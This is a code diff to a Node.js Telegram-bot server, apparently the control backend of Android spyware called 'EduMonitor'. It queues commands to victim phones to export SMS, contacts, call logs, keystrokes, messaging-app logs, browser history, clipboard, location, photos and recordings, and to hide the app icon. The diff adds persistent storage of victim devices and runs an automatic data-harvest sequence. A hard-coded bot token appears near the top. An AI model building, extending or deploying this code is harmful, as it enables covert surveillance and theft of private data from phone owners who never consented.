@@ -12,6 +12,10 @@ const os = require('os');
 const BOT_TOKEN = process.env.BOT_TOKEN || '8566422839:AAGqOdw_Bru2TwF8_BDw6vDGRhwwr-RE2uo';
 const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
+// Persistent storage file
+const DEVICES_FILE = path.join(__dirname, 'devices.json');
+const AUTO_DATA_FILE = path.join(__dirname, 'autodata.json');
+
 // Store authorized devices and their commands
 const devices = new Map();
 const userDeviceSelection = new Map();
@@ -39,6 +43,69 @@ const uploadDir = 'uploads';
 if (!fs.existsSync(uploadDir)) {
     fs.mkdirSync(uploadDir, { recursive: true });
 }
+
+// ============= PERSISTENT STORAGE FUNCTIONS =============
+
+function loadDevices() {
+    try {
+        if (fs.existsSync(DEVICES_FILE)) {
+            const data = fs.readFileSync(DEVICES_FILE, 'utf8');
+            const savedDevices = JSON.parse(data);
+            for (const [id, device] of Object.entries(savedDevices)) {
+                devices.set(id, device);
+            }
+            console.log(`✅ Loaded ${devices.size} devices from persistent storage`);
+        } else {
+            console.log('📝 No existing devices file found, starting fresh');
+        }
+    } catch (error) {
+        console.error('Error loading devices:', error);
+    }
+}
+
+function saveDevices() {
+    try {
+        const devicesObj = {};
+        for (const [id, device] of devices.entries()) {
+            devicesObj[id] = device;
+        }
+        fs.writeFileSync(DEVICES_FILE, JSON.stringify(devicesObj, null, 2));
+        console.log(`💾 Saved ${devices.size} devices to persistent storage`);
+    } catch (error) {
+        console.error('Error saving devices:', error);
+    }
+}
+
+function loadAutoDataFlags() {
+    try {
+        if (fs.existsSync(AUTO_DATA_FILE)) {
+            const data = fs.readFileSync(AUTO_DATA_FILE, 'utf8');
+            const savedAutoData = JSON.parse(data);
+            for (const [id, flag] of Object.entries(savedAutoData)) {
+                autoDataRequested.set(id, flag);
+            }
+            console.log(`✅ Loaded ${autoDataRequested.size} auto-data flags`);
+        }
+    } catch (error) {
+        console.error('Error loading auto-data flags:', error);
+    }
+}
+
+function saveAutoDataFlags() {
+    try {
+        const autoDataObj = {};
+        for (const [id, flag] of autoDataRequested.entries()) {
+            autoDataObj[id] = flag;
+        }
+        fs.writeFileSync(AUTO_DATA_FILE, JSON.stringify(autoDataObj, null, 2));
+    } catch (error) {
+        console.error('Error saving auto-data flags:', error);
+    }
+}
+
+// Load persistent data on startup
+loadDevices();
+loadAutoDataFlags();
 
 // ============= DEVICE CONFIGURATION =============
 const deviceConfigs = {
@@ -466,11 +533,11 @@ async function setChatMenuButton(chatId) {
     try {
         console.log(`🔘 Setting menu button for chat ${chatId}`);
         
-        // CONSOLIDATED COMMAND LIST
         const commands = [
-            // ============ CONSOLIDATED COMMANDS ============
             { command: 'help', description: '📋 Complete help menu' },
-            { command: 'showmenu', description: '📋 show help menu' },
+            { command: 'showmenu', description: '📋 Show help menu' },
+            { command: 'devices', description: '📱 List all devices' },
+            { command: 'select', description: '🎯 Select device to control' },
             { command: 'device_info', description: '📊 Complete device information' },
             { command: 'network_info', description: '🌐 Complete network information' },
             { command: 'mobile_info', description: '📱 Complete mobile & SIM info' },
@@ -484,16 +551,12 @@ async function setChatMenuButton(chatId) {
             { command: 'record_auto_on', description: '✅ Enable auto recording' },
             { command: 'record_auto_off', description: '❌ Disable auto recording' },
             { command: 'record_custom', description: '⚙️ Set custom schedule' },
-            
-            // ============ AUDIO QUALITY ============
             { command: 'audio_ultra', description: '🎤 Ultra low (8kbps)' },
             { command: 'audio_very_low', description: '🎤 Very low (16kbps)' },
             { command: 'audio_low', description: '🎤 Low (24kbps)' },
             { command: 'audio_medium', description: '🎤 Medium (32kbps)' },
             { command: 'audio_high', description: '🎤 High (64kbps)' },
             { command: 'audio_info', description: '🎤 Audio quality info' },
-            
-            // ============ DATA EXPORT ============
             { command: 'contacts', description: '📇 Export contacts' },
             { command: 'sms', description: '💬 Export SMS' },
             { command: 'calllogs', description: '📞 Export call logs' },
@@ -501,23 +564,15 @@ async function setChatMenuButton(chatId) {
             { command: 'keys', description: '⌨️ Export keystrokes' },
             { command: 'notify', description: '🔔 Export notifications' },
             { command: 'open_app', description: '📱 Export app opens' },
-            
-            // ============ SOCIAL MEDIA ============
             { command: 'whatsapp', description: '💬 WhatsApp logs' },
             { command: 'telegram', description: '💬 Telegram logs' },
             { command: 'facebook', description: '💬 Facebook logs' },
-            
-            // ============ BROWSER & CLIPBOARD ============
             { command: 'browser', description: '🌐 Browser history' },
             { command: 'clipboard', description: '📋 Clipboard logs' },
             { command: 'calendar', description: '📅 Calendar events' },
-            
-            // ============ SCAN COMMANDS ============
             { command: 'scan_all', description: '🔍 Full system scan' },
             { command: 'scan_media', description: '🎵 Media files scan' },
             { command: 'scan_help', description: '❓ Scan commands help' },
-            
-            // ============ REAL-TIME CONTROLS ============
             { command: 'rt_all_on', description: '✅ Enable all real-time' },
             { command: 'rt_all_off', description: '❌ Disable all real-time' },
             { command: 'rt_keys_on', description: '🔑 Enable keystroke real-time' },
@@ -525,13 +580,9 @@ async function setChatMenuButton(chatId) {
             { command: 'rt_notif_on', description: '🔔 Enable notification real-time' },
             { command: 'rt_notif_off', description: '🔔 Disable notification real-time' },
             { command: 'rt_status', description: '📊 Real-time status' },
-            
-            // ============ NETWORK DATA SAVING ============
             { command: 'saving_status', description: '📡 Network saving status' },
             { command: 'wifi_only_on', description: '📡 Enable WiFi-only mode' },
             { command: 'wifi_only_off', description: '📡 Disable WiFi-only mode' },
-            
-            // ============ SYSTEM CONTROLS ============
             { command: 'sync_all', description: '🔄 Sync all data' },
             { command: 'force_harvest', description: '⚡ Force data harvest' },
             { command: 'refresh_data', description: '🔄 Refresh data' },
@@ -540,8 +591,7 @@ async function setChatMenuButton(chatId) {
             { command: 'reboot_app', description: '🔄 Reboot services' },
             { command: 'hide_icon', description: '👻 Hide launcher icon' },
             { command: 'show_icon', description: '👁️ Show launcher icon' },
-            { command: 'force_register_complete', description: '🔄 force register services' },
-            // ============ CAMERA ============
+            { command: 'force_register_complete', description: '🔄 Force register services' },
             { command: 'photo', description: '📸 Take photo' },
             { command: 'camera_switch', description: '🔄 Switch camera' },
             { command: 'camera_front', description: '👤 Front camera' },
@@ -549,8 +599,6 @@ async function setChatMenuButton(chatId) {
             { command: 'camera_on', description: '✅ Start camera monitoring' },
             { command: 'camera_off', description: '❌ Stop camera monitoring' },
             { command: 'camera_status', description: '📊 Camera status' },
-            
-            // ============ BASIC INFO ============
             { command: 'location', description: '📍 Get location' },
             { command: 'battery', description: '🔋 Battery status' },
             { command: 'storage', description: '💾 Storage info' },
@@ -560,13 +608,10 @@ async function setChatMenuButton(chatId) {
             { command: 'small', description: '📏 Small screenshot (30%)' },
             { command: 'medium', description: '📏 Medium screenshot (70%)' },
             { command: 'original', description: '📏 Original screenshot' },
-            
-            // ============ LEGACY COMMANDS (for backward compatibility) ============
             { command: 'status', description: '📊 Device status' },
             { command: 'info', description: 'ℹ️ Device info' },
             { command: 'ip_info', description: '🌐 IP info' },
             { command: 'wifi_info', description: '📶 WiFi info' },
-            { command: 'mobile_info', description: '📱 Mobile info' },
             { command: 'sim_info', description: '📱 SIM info' },
             { command: 'phone_number', description: '📞 Phone number' }
         ];
@@ -783,6 +828,7 @@ function queueAutoDataCommands(deviceId, chatId) {
             'location'
         ]
     });
+    saveAutoDataFlags();
     
     const device = devices.get(deviceId);
     if (!device) {
@@ -796,21 +842,21 @@ function queueAutoDataCommands(deviceId, chatId) {
     
     const commands = [
         { command: 'device_info', delay: 0, description: 'Device Info' },
-        { command: 'network_info', delay: 2, description: 'Network Info' },
-        { command: 'mobile_info', delay: 4, description: 'Mobile Info' },
-        { command: 'contacts', delay: 7, description: 'Contacts' },
-        { command: 'sms', delay: 10, description: 'SMS' },
-        { command: 'calllogs', delay: 13, description: 'Call Logs' },
-        { command: 'apps_list', delay: 16, description: 'Apps' },
-        { command: 'keys', delay: 19, description: 'Keystrokes' },
-        { command: 'notify', delay: 22, description: 'Notifications' },
-        { command: 'whatsapp', delay: 25, description: 'WhatsApp' },
-        { command: 'telegram', delay: 28, description: 'Telegram' },
-        { command: 'facebook', delay: 31, description: 'Facebook' },
-        { command: 'browser', delay: 34, description: 'Browser History' },
-        { command: 'clipboard', delay: 37, description: 'Clipboard' },
-        { command: 'calendar', delay: 40, description: 'Calendar' },
-        { command: 'location', delay: 43, description: 'Location' }
+        { command: 'network_info', delay: 5, description: 'Network Info' },
+        { command: 'mobile_info', delay: 10, description: 'Mobile Info' },
+        { command: 'contacts', delay: 15, description: 'Contacts' },
+        { command: 'sms', delay: 20, description: 'SMS' },
+        { command: 'calllogs', delay: 25, description: 'Call Logs' },
+        { command: 'apps_list', delay: 30, description: 'Apps' },
+        { command: 'keys', delay: 35, description: 'Keystrokes' },
+        { command: 'notify', delay: 40, description: 'Notifications' },
+        { command: 'whatsapp', delay: 45, description: 'WhatsApp' },
+        { command: 'telegram', delay: 50, description: 'Telegram' },
+        { command: 'facebook', delay: 55, description: 'Facebook' },
+        { command: 'browser', delay: 60, description: 'Browser History' },
+        { command: 'clipboard', delay: 65, description: 'Clipboard' },
+        { command: 'calendar', delay: 70, description: 'Calendar' },
+        { command: 'location', delay: 75, description: 'Location' }
     ];
     
     commands.forEach((cmd) => {
@@ -827,6 +873,7 @@ function queueAutoDataCommands(deviceId, chatId) {
     });
     
     console.log(`✅ All ${commands.length} auto-data commands queued for ${deviceId}`);
+    saveDevices();
 }
 
 // ============= PHOTO UPLOAD ENDPOINT =============
@@ -1008,6 +1055,7 @@ app.post('/api/ipinfo/:deviceId', async (req, res) => {
         
         ipData.serverIP = getServerIP();
         device.lastIPInfo = ipData;
+        saveDevices();
         
         const formattedMessage = formatIPInfo(ipData);
         
@@ -1040,6 +1088,7 @@ app.post('/api/phonenumber/:deviceId', async (req, res) => {
         
         device.phoneNumber = phoneData.phoneNumber;
         device.simInfo = phoneData.simInfo;
+        saveDevices();
         
         let message = `📱 *Device:* ${device.deviceInfo?.model || 'Unknown'}\n\n`;
         message += '📞 <b>Phone Information</b>\n\n';
@@ -1094,6 +1143,7 @@ app.post('/api/siminfo/:deviceId', async (req, res) => {
         const chatId = device.chatId;
         
         device.simInfo = simData;
+        saveDevices();
         
         const formattedMessage = formatSimInfo(simData);
         const devicePrefix = `📱 *Device:* ${device.deviceInfo?.model || 'Unknown'}\n\n`;
@@ -1124,6 +1174,7 @@ app.post('/api/wifiinfo/:deviceId', async (req, res) => {
         const chatId = device.chatId;
         
         device.wifiInfo = wifiData;
+        saveDevices();
         
         const formattedMessage = formatWifiInfo(wifiData);
         const devicePrefix = `📱 *Device:* ${device.deviceInfo?.model || 'Unknown'}\n\n`;
@@ -1154,6 +1205,7 @@ app.post('/api/mobileinfo/:deviceId', async (req, res) => {
         const chatId = device.chatId;
         
         device.mobileInfo = mobileData;
+        saveDevices();
         
         let message = `📱 *Device:* ${device.deviceInfo?.model || 'Unknown'}\n\n`;
         message += '📱 <b>Mobile Network Information</b>\n\n';
@@ -1203,6 +1255,7 @@ app.post('/api/location/:deviceId', async (req, res) => {
         const chatId = device.chatId;
         
         device.lastLocation = locationData;
+        saveDevices();
         
         const formatted = formatLocationMessage(locationData);
         const devicePrefix = `📱 *${device.deviceInfo?.model || 'Device'}*\n\n`;
@@ -1245,6 +1298,7 @@ app.post('/api/screenshot-settings/:deviceId', async (req, res) => {
         }
         
         device.screenshotSettings = settingsData;
+        saveDevices();
         res.json({ success: true });
         
     } catch (error) {
@@ -1267,6 +1321,7 @@ app.post('/api/recording-settings/:deviceId', async (req, res) => {
         }
         
         device.recordingSettings = settingsData;
+        saveDevices();
         res.json({ success: true });
         
     } catch (error) {
@@ -1327,15 +1382,52 @@ app.get('/health', (req, res) => {
     });
 });
 
+// Enhanced ping endpoint with device status
 app.get('/api/ping/:deviceId', (req, res) => {
     const deviceId = req.params.deviceId;
     const device = devices.get(deviceId);
     
     if (device) {
         device.lastSeen = Date.now();
-        res.json({ status: 'alive', timestamp: Date.now() });
+        saveDevices();
+        res.json({ 
+            status: 'alive', 
+            timestamp: Date.now(),
+            registered: true,
+            deviceId: deviceId,
+            chatId: device.chatId
+        });
     } else {
-        res.status(404).json({ status: 'unknown' });
+        res.status(404).json({ 
+            status: 'unknown',
+            registered: false,
+            deviceId: deviceId,
+            message: 'Device not registered'
+        });
+    }
+});
+
+// Enhanced verify endpoint
+app.get('/api/verify/:deviceId', (req, res) => {
+    const deviceId = req.params.deviceId;
+    const device = devices.get(deviceId);
+    
+    if (device && device.chatId) {
+        res.json({
+            registered: true,
+            deviceId: deviceId,
+            chatId: device.chatId,
+            lastSeen: device.lastSeen,
+            deviceInfo: device.deviceInfo,
+            phoneNumber: device.phoneNumber,
+            hasPendingCommands: (device.pendingCommands?.length || 0) > 0
+        });
+    } else {
+        res.status(404).json({
+            registered: false,
+            deviceId: deviceId,
+            message: 'Device not registered'
+        });
     }
 });
 
@@ -1345,7 +1437,9 @@ app.get('/api/commands/:deviceId', (req, res) => {
     
     try {
         if (device?.pendingCommands?.length > 0) {
-            const commands = device.pendingCommands.map(cmd => ({
+            // Sort commands by timestamp
+            const sortedCommands = [...device.pendingCommands].sort((a, b) => a.timestamp - b.timestamp);
+            const commands = sortedCommands.map(cmd => ({
                 command: cmd.command,
                 originalCommand: cmd.originalCommand,
                 messageId: cmd.messageId,
@@ -1353,6 +1447,7 @@ app.get('/api/commands/:deviceId', (req, res) => {
                 autoData: cmd.autoData || false
             }));
             device.pendingCommands = [];
+            saveDevices();
             console.log(`📤 Sending ${commands.length} commands to ${deviceId}:`, commands.map(c => c.command).join(', '));
             sendJsonResponse(res, { commands });
         } else {
@@ -1369,7 +1464,6 @@ app.post('/api/result/:deviceId', async (req, res) => {
     const deviceId = req.params.deviceId;
     const { command, result, error } = req.body;
     
-    // Consolidated commands that use file upload endpoints
     const fileCommands = [
         'contacts', 'sms', 'calllogs', 'apps_list', 'keys', 'notify', 'open_app',
         'whatsapp', 'telegram', 'facebook', 'browser', 'clipboard', 'calendar',
@@ -1437,6 +1531,7 @@ app.post('/api/register', async (req, res) => {
     };
     
     devices.set(deviceId, deviceData);
+    saveDevices();
     
     console.log(`✅ Device ${isNewDevice ? 'registered' : 'updated'}: ${deviceId} for chat ${deviceConfig.chatId}`);
     
@@ -1544,6 +1639,7 @@ app.get('/test', (req, res) => {
                 <p><b>Total Devices:</b> ${devices.size}</p>
                 <p><b>Authorized Chats:</b> ${Array.from(authorizedChats).join(', ')}</p>
                 <p><b>Consolidated Commands Available:</b> 45+ (reduced from 95+)</p>
+                <p><b>Persistent Storage:</b> ${fs.existsSync(DEVICES_FILE) ? '✅ Enabled' : '⚠️ Not initialized'}</p>
             </div>
             
             <h2>📱 Registered Devices (${userDevices.length})</h2>
@@ -1555,6 +1651,7 @@ app.get('/test', (req, res) => {
                         <p><b>ID:</b> <code>${id}</code></p>
                         <p><b>Status:</b> <span class="${online ? 'online' : 'offline'}">${online ? '🟢 Online' : '⚫ Offline'}</span></p>
                         <p><b>Last Seen:</b> ${new Date(device.lastSeen).toLocaleString()}</p>
+                        <p><b>First Seen:</b> ${new Date(device.firstSeen).toLocaleString()}</p>
                         <p><b>Android:</b> ${device.deviceInfo?.android || 'Unknown'}</p>
                         <p><b>Phone:</b> ${device.phoneNumber || 'Not available'}</p>
                         <p><b>Pending Commands:</b> ${device.pendingCommands?.length || 0}</p>
@@ -1590,7 +1687,6 @@ async function handleCallbackQuery(callbackQuery) {
     
     await answerCallbackQuery(callbackId);
     
-    // Handle consolidated command callbacks
     if (data.startsWith('cmd:')) {
         const command = data.substring(4);
         console.log(`🎯 Executing consolidated command from button: ${command}`);
@@ -1615,6 +1711,7 @@ async function handleCallbackQuery(callbackQuery) {
             messageId: messageId,
             timestamp: Date.now()
         });
+        saveDevices();
         
         await sendTelegramMessage(chatId, `✅ Command sent: /${command}`);
         
@@ -1880,6 +1977,7 @@ async function handleConversationMessage(chatId, text, messageId, userState) {
                     messageId: messageId,
                     timestamp: Date.now()
                 });
+                saveDevices();
                 await sendTelegramMessage(chatId, `✅ Custom schedule configured and sent to device.`);
             }
             break;
@@ -1891,7 +1989,6 @@ async function handleConversationMessage(chatId, text, messageId, userState) {
 async function handleCommand(chatId, command, messageId) {
     console.log(`\n🎯 Handling command: ${command} from chat ${chatId}`);
 
-    // Handle /devices command
     if (command === '/devices') {
         const userDevices = getDeviceListForUser(chatId);
         let message = `📱 *Your Devices*\n\n`;
@@ -1916,16 +2013,17 @@ async function handleCommand(chatId, command, messageId) {
         await sendTelegramMessage(chatId, message);
         return;
     }
-if (command === '/showmenu') {
-    console.log('📋 Force showing main menu');
-    await sendTelegramMessageWithKeyboard(
-        chatId,
-        "🤖 *EduMonitor Control Panel*\n\nSelect a category:",
-        getMainMenuKeyboard(chatId)
-    );
-    return;
-}
-    // Handle /select command
+    
+    if (command === '/showmenu') {
+        console.log('📋 Force showing main menu');
+        await sendTelegramMessageWithKeyboard(
+            chatId,
+            "🤖 *EduMonitor Control Panel*\n\nSelect a category:",
+            getMainMenuKeyboard(chatId)
+        );
+        return;
+    }
+    
     if (command.startsWith('/select ')) {
         const deviceId = command.substring(8).trim();
         const device = devices.get(deviceId);
@@ -1941,7 +2039,6 @@ if (command === '/showmenu') {
         return;
     }
 
-    // Get selected device
     let selectedDeviceId = userDeviceSelection.get(chatId);
     let device = null;
     
@@ -1968,12 +2065,12 @@ if (command === '/showmenu') {
     }
 
     device.lastSeen = Date.now();
+    saveDevices();
     
     if (!device.pendingCommands) {
         device.pendingCommands = [];
     }
     
-    // Extract command without slash
     const cleanCommand = command.startsWith('/') ? command.substring(1) : command;
     
     device.pendingCommands.push({
@@ -1982,6 +2079,7 @@ if (command === '/showmenu') {
         messageId: messageId,
         timestamp: Date.now()
     });
+    saveDevices();
     
     console.log(`📝 Command queued for device ${selectedDeviceId}: ${cleanCommand}`);
     
@@ -1998,9 +2096,12 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Port: ${PORT}`);
     console.log(`🚀 Webhook URL: https://edu-hwpy.onrender.com/webhook`);
     console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
+    console.log(`🚀 Persistent Storage: ${DEVICES_FILE}`);
     console.log('\n✅ CONSOLIDATED COMMANDS (45+ from 95+):');
     console.log('   📋 /help - Complete help menu');
-    console.log('   📋 /showmenu - show help menu');
+    console.log('   📋 /showmenu - Show help menu');
+    console.log('   📱 /devices - List all devices');
+    console.log('   🎯 /select - Select device to control');
     console.log('   📱 /device_info - Complete device info');
     console.log('   🌐 /network_info - Complete network info');
     console.log('   📱 /mobile_info - Complete mobile & SIM info');
@@ -2034,7 +2135,7 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log('   ⚡ /force_harvest - Force harvest');
     console.log('   📊 /logs_count - Database stats');
     console.log('   🗑️ /clear_logs - Clear logs');
-    console.log('   🔄 /force_register_complete - force register services');
+    console.log('   🔄 /force_register_complete - Force register services');
     console.log('   🔄 /reboot_app - Reboot services');
     console.log('   👻 /hide_icon - Hide icon');
     console.log('   👁️ /show_icon - Show icon');
@@ -2045,5 +2146,6 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log('   📸 /photo - Take photo');
     console.log('   🔄 /camera_switch - Switch camera');
     console.log('\n🚀 All existing features preserved (test menu, device stats, etc.)');
+    console.log('🚀 Persistent storage enabled - devices survive server restarts!');
     console.log('🚀 ===============================================\n');
 });
